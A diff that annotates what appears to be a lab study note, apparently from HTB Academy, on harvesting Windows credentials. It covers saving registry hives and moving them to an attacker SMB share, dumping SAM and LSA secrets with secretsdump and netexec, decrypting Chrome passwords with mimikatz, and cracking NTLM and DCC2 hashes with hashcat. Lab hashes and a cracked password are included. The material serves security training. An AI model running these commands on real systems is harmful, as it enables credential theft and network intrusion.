@@ -27,6 +27,7 @@ reg.exe save hklm\sam C:\sam.save
 reg.exe save hklm\system C:\system.save
 reg.exe save hklm\security C:\security.save
 ```
+> Exports three registry hives to disk as binary files. Requires Administrator. You need all three: SAM contains the hashes, SYSTEM has the boot key to decrypt them, and SECURITY holds cached domain credentials and DPAPI keys.
 
 ### Step 2 — Transfer to Attack Host via SMB
 
@@ -34,6 +35,7 @@ reg.exe save hklm\security C:\security.save
 ```bash
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/loot/
 ```
+> Starts an SMB share named `CompData` backed by `/home/user/loot/` on the attack host. `-smb2support` is required for modern Windows clients. The target can then `move` files to `\\ATTACKER_IP\CompData`.
 
 **On target — move files to share:**
 ```cmd
@@ -41,12 +43,14 @@ move sam.save \\<ATTACKER-IP>\CompData
 move system.save \\<ATTACKER-IP>\CompData
 move security.save \\<ATTACKER-IP>\CompData
 ```
+> Transfers the saved hive files from the Windows target to the SMB share on the attack host. Replace `<ATTACKER-IP>` with the attack host's tun0 IP address.
 
 ### Step 3 — Dump Hashes with secretsdump
 
 ```bash
 python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ```
+> Decrypts the SAM database offline using the SYSTEM boot key. `LOCAL` means it uses the provided files instead of connecting to a live host. Output format is `username:RID:LMhash:NThash:::`. Grab the NT hash (4th field) for cracking.
 
 **Output format:** `username:RID:LMhash:NThash:::`
 
@@ -57,6 +61,7 @@ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -s
 # Hash mode 1000 = NTLM
 hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
 ```
+> `-m 1000` is NTLM (NT hash). This is one of the fastest hash types for hashcat — millions of guesses per second on a GPU. Even complex passwords often fall with rockyou + rules.
 
 ---
 
@@ -67,12 +72,14 @@ hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
 ```bash
 netexec smb <TARGET-IP> --local-auth -u <user> -p '<password>' --sam
 ```
+> Dumps the SAM database remotely over SMB. `--local-auth` authenticates against the local SAM instead of a domain. Requires local admin privileges. Results print directly to the terminal.
 
 ### Dump LSA Secrets Remotely
 
 ```bash
 netexec smb <TARGET-IP> --local-auth -u <user> -p '<password>' --lsa
 ```
+> Dumps Local Security Authority (LSA) secrets, which can contain cleartext service account passwords, DPAPI machine/user keys, and cached domain credentials. Often more valuable than SAM hashes.
 
 > `--local-auth` = authenticate against local SAM (not domain). Required for workgroup/local accounts.
 
@@ -89,6 +96,7 @@ netexec smb <TARGET-IP> --local-auth -u <user> -p '<password>' --lsa
 # Hashcat mode 2100 = DCC2
 hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
 ```
+> Cracks a Domain Cached Credential (DCC2) hash. Quote the hash to prevent the shell from interpreting `$`. About 800 times slower than NTLM cracking. Use a tight wordlist — long brute-force runs are impractical.
 
 ---
 
@@ -113,6 +121,7 @@ hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /us
 mimikatz.exe
 mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
+> Decrypts Chrome's saved passwords using the current user's DPAPI key. `/in:` points to Chrome's SQLite credential database. `/unprotect` calls the Windows Data Protection Application Programming Interface (DPAPI) to decrypt. Must run as the target user.
 
 ### Other DPAPI Tools
 - `impacket-dpapi`
@@ -179,6 +188,7 @@ mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data
 ```bash
 impacket-secretsdump 'FRONTDESK01/bob:HTB_@cademy_stdnt!@10.129.62.31'
 ```
+> Remotely dumps SAM, LSA secrets, and cached domain credentials in one command. Format is `MACHINE/user:pass@IP`. Requires local admin. Output includes all NT hashes and LSA secrets.
 
 **SAM dump output (relevant lines):**
 ```
@@ -197,6 +207,7 @@ frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71
 echo 'c02478537b9727d391bc80011c2e2321' > /tmp/itbackdoor.hash
 hashcat -m 1000 /tmp/itbackdoor.hash /usr/share/wordlists/rockyou.txt
 ```
+> Saves a single NT hash to a file and cracks it with hashcat. Isolating one hash avoids noise from multiple results. The cracked password appears as `hash:plaintext` in the output.
 
 **Result:** `c02478537b9727d391bc80011c2e2321:matrix`
 
@@ -208,6 +219,7 @@ hashcat -m 1000 /tmp/itbackdoor.hash /usr/share/wordlists/rockyou.txt
 ```bash
 netexec smb 10.129.62.31 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa
 ```
+> Dumps LSA secrets remotely. `--local-auth` uses the local account instead of a domain account. LSA secrets often contain cleartext service account passwords — look for lines without a hash format.
 
 **Output:**
 ```
